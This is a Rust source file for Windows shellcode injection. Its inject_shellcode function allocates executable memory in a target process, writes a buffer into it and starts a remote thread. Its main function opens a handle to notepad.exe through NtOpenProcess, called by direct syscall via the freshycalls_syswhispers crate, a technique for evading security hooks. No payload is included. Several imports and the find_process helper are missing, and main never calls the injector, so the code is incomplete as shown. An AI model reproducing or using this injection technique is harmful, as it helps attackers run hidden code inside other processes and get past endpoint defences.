use std::{os::windows::raw::HANDLE, ptr::null_mut};

use freshycalls_syswhispers::{self, syscall, syscall_resolve::get_process_id_by_name};
use ntapi::{
    ntapi_base::CLIENT_ID,
    winapi::{
        shared::ntdef::{NT_SUCCESS, OBJECT_ATTRIBUTES},
        um::winnt::{PROCESS_VM_READ, PROCESS_VM_WRITE},
    },
};


pub fn inject_shellcode(process_name: String, buf: Vec<u8>) -> Result<HANDLE, &'static str> {
    let addr: *mut c_void;

    let h_process: HANDLE = find_process(process_name)?;

    println!("h_process: {:?}", h_process);
    unsafe {
        addr = VirtualAllocEx(
                h_process,
            ptr::null(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
    }

    let mut nb_written_bytes = 0;
    let shellcode = buf.as_ptr() as *const c_void;

    if unsafe { WriteProcessMemory(h_process, addr, shellcode, buf.len(), &mut nb_written_bytes) }
       == 0
    {
        println!("Error in WriteProcessMemory");
        return Err("Couldn't write process memory");
    }

    let base_addr: LPTHREAD_START_ROUTINE;
    unsafe {
        base_addr = Some(
                *(&addr as *const _
                as *const extern "system" fn(lpthreadparameter: *mut c_void) -> u32),
        );
    }
    unsafe {
        Ok(CreateRemoteThread(
                h_process,
            ptr::null(),
            0,
            base_addr,
            ptr::null(),
            0,
            ptr::null_mut(),
        ))
    }
}

fn main() {

    let mut oa = OBJECT_ATTRIBUTES::default();

    let process_id = get_process_id_by_name("notepad.exe");
    let mut process_handle = process_id as HANDLE;

    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    let status = unsafe {
        syscall!(
            "NtOpenProcess",
            &mut process_handle,
            PROCESS_VM_WRITE | PROCESS_VM_READ,
            &mut oa,
            &mut ci
        )
    };

    println!("status: {:#x}", status);

    if !NT_SUCCESS(status) {
        unsafe { syscall!("NtClose", process_handle) };
        panic!("Failed to get a handle to the target process");
    }

    log::debug!("Process Handle: {:?}", process_handle);
    unsafe { syscall!("NtClose", process_handle) };
}